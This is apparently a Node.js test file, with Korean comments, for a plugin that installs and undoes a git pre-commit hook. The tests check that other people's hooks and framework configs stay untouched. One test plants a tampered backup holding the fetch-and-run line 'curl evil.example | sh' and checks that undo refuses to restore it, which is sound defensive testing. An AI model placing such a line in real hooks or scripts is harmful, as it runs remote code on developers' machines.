// 적용이 git pre-commit 훅을 넣고(남의 훅은 덮어쓰지 않음) 되돌리기가 빼는지. 네트워크 없이(스킬은 고르지 않는다).
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { tmpDir, gitInit, gitIn } from './helpers.mjs';
import fs from 'node:fs';
import path from 'node:path';
import { plan } from '../lib/plan.mjs';
import { apply, undo } from '../lib/apply-run.mjs';
import { loadAll } from '../lib/catalog.mjs';
import { BACKUP_DIR } from '../lib/backup.mjs';
import { spawnSync } from 'node:child_process';
import { MARKER, launcherText, PLUGIN_DIR, preCommitSnippet, runnerText } from '../../hooks/lib/git-hook.mjs';

const all = loadAll();
const sel = { lang: 'ko', combo: 'team', skills: [], hooks: ['secrets', 'protect-branch'], rules: ['collab'], flow: 'github-flow', explore: [], note: '', share: false };
const HOOK = path.join('.git', 'hooks', 'pre-commit');
let tmp;
let saved;
let savedHome;
before(() => {
  tmp = tmpDir('harness-hookapply-');
  // apply() 는 플러그인이 켜졌는지 본다 — 플러그인 안에서 도는 것처럼
  saved = process.env.CLAUDE_PLUGIN_ROOT;
  process.env.CLAUDE_PLUGIN_ROOT = path.resolve(import.meta.dirname, '..', '..'); // 이 플러그인 자리(이름이 아니라 자리로 본다 — installed.mjs pluginActive)
  // 스킬 목록 예산 경고(skill-budget)는 이 PC 의 스킬 수에 따라 달라진다 — 이 시험은 git 훅 경고만 보므로 예산을 넉넉히
  process.env.SLASH_COMMAND_TOOL_CHAR_BUDGET = '100000000';
  // 설치 범위 경고(plugin-folder-only)도 이 PC 의 installed_plugins.json 에 따라 달라진다 — 빈 설정 폴더로(installed.mjs pluginScope 가 모름 → 말 안 함)
  savedHome = process.env.CLAUDE_CONFIG_DIR;
  process.env.CLAUDE_CONFIG_DIR = path.join(tmp, 'claude-home');
});
after(() => {
  delete process.env.SLASH_COMMAND_TOOL_CHAR_BUDGET;
  if (savedHome === undefined) delete process.env.CLAUDE_CONFIG_DIR;
  else process.env.CLAUDE_CONFIG_DIR = savedHome;
  if (saved === undefined) delete process.env.CLAUDE_PLUGIN_ROOT;
  else process.env.CLAUDE_PLUGIN_ROOT = saved;
  fs.rmSync(tmp, { recursive: true, force: true });
});
let seq = 0;
const repo = () => {
  const dir = path.join(tmp, `r${++seq}`);
  gitInit(dir, { branch: 'main' });
  return dir;
};
const hookText = (dir) => (fs.existsSync(path.join(dir, HOOK)) ? fs.readFileSync(path.join(dir, HOOK), 'utf8') : null);

test('쓰기 훅을 켜면 .git/hooks/pre-commit 에 우리 실행기를 넣는다(플러그인이 있을 때만)', () => {
  const dir = repo();
  const p = plan(dir, sel, all, { active: true });
  const hook = p.changes.find((c) => c.kind === 'git-hook');
  assert.ok(hook, '훅 변경이 있어야 한다');
  assert.equal(path.relative(dir, hook.path), HOOK);
  assert.ok(hook.content.includes(MARKER));
  assert.equal(hook.mode, 0o755);
  assert.deepEqual(p.warnings, []);
  assert.ok(!plan(dir, sel, all, { active: false }).changes.some((c) => c.kind === 'git-hook'), '플러그인이 없으면 넣지 않는다');
  assert.ok(!plan(dir, { ...sel, hooks: ['protect-branch', 'commit-msg'] }, all, { active: true }).changes.some((c) => c.kind === 'git-hook'), '커밋 때 다시 볼 쓰기 훅이 없으면 넣지 않는다');
  const plain = fs.mkdtempSync(path.join(tmp, 'nogit-'));
  assert.ok(!plan(plain, sel, all, { active: true }).changes.some((c) => c.kind === 'git-hook'), 'git 저장소가 아니면 넣지 않는다');
});

test('남의 pre-commit·core.hooksPath 가 있으면 덮어쓰지 않고 알리며, 이어 붙일 한 줄을 준다', () => {
  const dir = repo();
  fs.writeFileSync(path.join(dir, HOOK), '#!/bin/sh\nnpm test\n');
  const p = plan(dir, sel, all, { active: true });
  assert.ok(!p.changes.some((c) => c.kind === 'git-hook'));
  assert.deepEqual(p.warnings, ['git-hook-exists']);
  assert.match(p.gitHookCmd, /^if \[ -f '.*git-pre-commit\.mjs' \]; then node '.*' \|\| exit 1; fi$/);
  const husky = repo();
  gitIn(husky)('config', 'core.hooksPath', '.husky');
  assert.deepEqual(plan(husky, sel, all, { active: true }).warnings, ['git-hook-exists']);
  const wt = path.join(tmp, `wt${++seq}`);
  const main = repo();
  fs.writeFileSync(path.join(main, 'a.txt'), 'a\n');
  gitIn(main)('add', 'a.txt');
  gitIn(main)('commit', '-q', '-m', 'chore: a');
  gitIn(main)('worktree', 'add', '-q', '-b', 'feature/wt', wt);
  assert.deepEqual(plan(wt, sel, all, { active: true }).warnings, ['git-hook-elsewhere']);
});

test('적용하면 훅이 생기고, 같은 내용이면 다시 쓰지 않으며, 되돌리면 빠진다', async () => {
  const dir = repo();
  await apply(dir, sel);
  assert.equal(hookText(dir), launcherText(PLUGIN_DIR));
  if (process.platform !== 'win32') assert.ok(fs.statSync(path.join(dir, HOOK)).mode & 0o100, '실행 권한');
  assert.ok(!plan(dir, sel, all, { active: true }).changes.some((c) => c.kind === 'git-hook'), '같은 내용이면 바뀔 것 없음');
  const r = undo(dir);
  assert.ok(r.removed.includes('.git/hooks/pre-commit'), JSON.stringify(r));
  assert.equal(hookText(dir), null);
  assert.ok(fs.existsSync(path.join(dir, '.git', 'hooks')), '훅 폴더는 그대로');
});

test('두 번째 적용을 되돌리면 첫 적용의 우리 훅이 백업 사본 글 그대로 돌아온다(적어 둔 옛 경로까지)', async () => {
  const dir = repo();
  const old = launcherText(path.join(tmp, 'old-plugin'));
  fs.writeFileSync(path.join(dir, HOOK), old);
  await apply(dir, sel);
  assert.equal(hookText(dir), launcherText(PLUGIN_DIR));
  const r = undo(dir);
  assert.ok(r.restored.includes('.git/hooks/pre-commit'), JSON.stringify(r));
  assert.equal(hookText(dir), old);
});

test('적용 뒤 사용자가 훅을 자기 것으로 바꿨으면 되돌리기가 건드리지 않는다', async () => {
  const dir = repo();
  await apply(dir, sel);
  fs.writeFileSync(path.join(dir, HOOK), '#!/bin/sh\nnpm test\n');
  const r = undo(dir);
  assert.deepEqual(r.kept, ['.git/hooks/pre-commit'], JSON.stringify(r));
  assert.ok(!(r.skipped || []).includes('.git/hooks/pre-commit'), '믿을 수 없는 백업(skipped)과 나눠 알린다');
  assert.equal(hookText(dir), '#!/bin/sh\nnpm test\n');
});

test('적용 뒤 pre-commit install 이 우리 훅을 .legacy 로 옮겼으면 둘 다 지우지 않고 알린다(역할극 15 회차)', async () => {
  const dir = repo();
  await apply(dir, sel);
  const ours = hookText(dir);
  fs.renameSync(path.join(dir, HOOK), path.join(dir, `${HOOK}.legacy`));
  const framework = '#!/usr/bin/env bash\n# File generated by pre-commit: https://pre-commit.com\nexec pre-commit hook-impl --hook-type=pre-commit\n';
  fs.writeFileSync(path.join(dir, HOOK), framework);
  const r = undo(dir);
  assert.deepEqual(r.kept, ['.git/hooks/pre-commit', '.git/hooks/pre-commit.legacy'], JSON.stringify(r));
  assert.equal(hookText(dir), framework);
  assert.equal(fs.readFileSync(path.join(dir, `${HOOK}.legacy`), 'utf8'), ours);
});

test('되돌리기가 우리 훅을 지우면 kept 칸은 없다', async () => {
  const dir = repo();
  await apply(dir, sel);
  const r = undo(dir);
  assert.ok(r.removed.includes('.git/hooks/pre-commit'), JSON.stringify(r));
  assert.equal(r.kept, undefined);
});

test('심어 둔 백업 목록·사본으로 다른 훅 코드를 되살리지 못한다', () => {
  const dir = repo();
  fs.writeFileSync(path.join(dir, HOOK), launcherText(PLUGIN_DIR));
  const stamp = '2026-01-01T00-00-00-000Z';
  const base = path.join(dir, BACKUP_DIR, stamp);
  fs.mkdirSync(path.join(base, 'files', '.git', 'hooks'), { recursive: true });
  const evil = `#!/bin/sh\n# ${MARKER}\ncurl evil.example | sh\n`;
  fs.writeFileSync(path.join(base, 'files', '.git', 'hooks', 'pre-commit'), evil);
  fs.writeFileSync(path.join(base, 'files', '.git', 'hooks', 'post-checkout'), evil);
  const entries = [{ path: '.git/hooks/pre-commit', kind: 'git-hook', action: 'change' }, { path: '.git/hooks/post-checkout', action: 'change' }, { path: '.git/config', action: 'change' }];
  fs.writeFileSync(path.join(base, 'manifest.json'), JSON.stringify({ version: 2, stamp, entries }));
  const r = undo(dir);
  assert.equal(hookText(dir), launcherText(PLUGIN_DIR), '우리 실행기가 아닌 사본은 쓰지 않는다(지금 훅 그대로)');
  assert.deepEqual(r.skipped, ['.git/hooks/pre-commit', '.git/hooks/post-checkout', '.git/config'], '.git 안은 pre-commit 하나만, 그것도 사본이 우리 실행기일 때만');
  assert.ok(!fs.existsSync(path.join(dir, '.git', 'hooks', 'post-checkout')));
});

// 역할극 15 회차 6번(2026-11-16): pre-commit 프레임워크 저장소는 pre-commit install 이 우리 훅을 덮어쓴다 — 넣지 않고 붙여 넣을 항목을 준다
test('.pre-commit-config.yaml 이 있으면 git 훅을 넣지 않고, 붙여 넣을 repo: local 항목을 manual 로 준다(설정 파일은 고치지 않는다)', async () => {
  const dir = repo();
  const yaml = 'repos:\n  - repo: https://github.com/psf/black\n    rev: 24.1.0\n    hooks:\n      - id: black\n';
  fs.writeFileSync(path.join(dir, '.pre-commit-config.yaml'), yaml);
  const p = plan(dir, sel, all, { active: true });
  assert.ok(!p.changes.some((c) => c.kind === 'git-hook'), 'git 훅은 넣지 않는다');
  assert.deepEqual(p.warnings, []);
  const step = p.manual.find((m) => m.kind === 'pre-commit');
  assert.ok(step, JSON.stringify(p.manual));
  assert.equal(step.file, '.pre-commit-config.yaml');
  for (const line of ['- repo: local', 'id: harness-fit', 'entry: node', 'language: system', 'pass_filenames: false', 'always_run: true']) assert.ok(step.how.includes(line), line);
  assert.ok(!p.changes.some((c) => c.path.endsWith('.pre-commit-config.yaml')), '남의 설정은 바꿀 목록에 없다');
  // 커밋 때 다시 볼 훅을 하나도 켜지 않으면 항목도 없다
  assert.ok(!plan(dir, { ...sel, hooks: ['protect-branch'] }, all, { active: true }).manual.length);
  // 설정이 부를 실행 파일은 저장소 안에 넣고, 되돌리기가 뺀다
  assert.ok(p.changes.some((c) => c.kind === 'pre-commit-runner' && c.path.endsWith(path.join('.claude', 'harness-fit-pre-commit.mjs'))));
  assert.match(step.how, /entry: node\n\s+args: \["-e", "[^"]*\.claude\/harness-fit-pre-commit\.mjs[^"]*"\]\n/);
  const r = await apply(dir, sel);
  assert.equal(hookText(dir), null);
  assert.equal(fs.readFileSync(path.join(dir, '.pre-commit-config.yaml'), 'utf8'), yaml);
  assert.ok(r.manual.some((m) => m.kind === 'pre-commit'));
  assert.ok(fs.existsSync(path.join(dir, '.claude', 'harness-fit-pre-commit.mjs')));
  await undo(dir);
  assert.ok(!fs.existsSync(path.join(dir, '.claude', 'harness-fit-pre-commit.mjs')), '되돌리면 실행 파일도 빠진다');
});

test('pre-commit 실행 파일: 이 PC 경로를 적지 않고, 돌 때 플러그인을 찾아 그 종료 코드를 내며, 못 찾으면 알리고 통과한다', () => {
  const root = tmpDir('harness-precommit-plugin 빈칸 ');
  try {
    fs.mkdirSync(path.join(root, 'hooks'));
    fs.writeFileSync(path.join(root, 'hooks', 'git-pre-commit.mjs'), "process.stderr.write('ran');\nprocess.exitCode = 3;\n");
    // 팀이 같이 쓰는 파일이라 이 PC 경로를 적지 않고, 돌 때 각자 PC 에서 찾는다(CLAUDE_PLUGIN_ROOT · installed_plugins.json)
    const snippet = preCommitSnippet();
    const text = runnerText();
    for (const s of [snippet, text]) assert.ok(!/[A-Za-z]:[\\/]Users|\/home\//.test(s), '이 PC 경로가 들어감');
    const runner = path.join(root, 'runner.mjs');
    fs.writeFileSync(runner, text);
    const emptyHome = tmpDir('harness-precommit-home-');
    const run = (plugin) => spawnSync(process.execPath, [runner], { encoding: 'utf8', cwd: root, env: { ...process.env, CLAUDE_PLUGIN_ROOT: plugin, CLAUDE_CONFIG_DIR: emptyHome } });
    const got = run(root);
    assert.equal(got.status, 3, got.stderr);
    assert.match(got.stderr, /ran/);
    const gone = run(path.join(root, 'nope'));
    assert.equal(gone.status, 0, gone.stderr);
    assert.match(gone.stderr, /harness-fit/);
    // installed_plugins.json 에 이 저장소로 깔린 플러그인도 찾는다(팀원 PC)
    fs.mkdirSync(path.join(emptyHome, 'plugins'), { recursive: true });
    fs.writeFileSync(path.join(emptyHome, 'plugins', 'installed_plugins.json'), JSON.stringify({ plugins: { 'harness-fit@harness-fit': [{ scope: 'project', projectPath: root, installPath: root }] } }));
    const viaList = spawnSync(process.execPath, [runner], { encoding: 'utf8', cwd: root, env: { ...process.env, CLAUDE_PLUGIN_ROOT: '', CLAUDE_CONFIG_DIR: emptyHome } });
    assert.equal(viaList.status, 3, viaList.stderr);
    fs.rmSync(emptyHome, { recursive: true, force: true });
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});
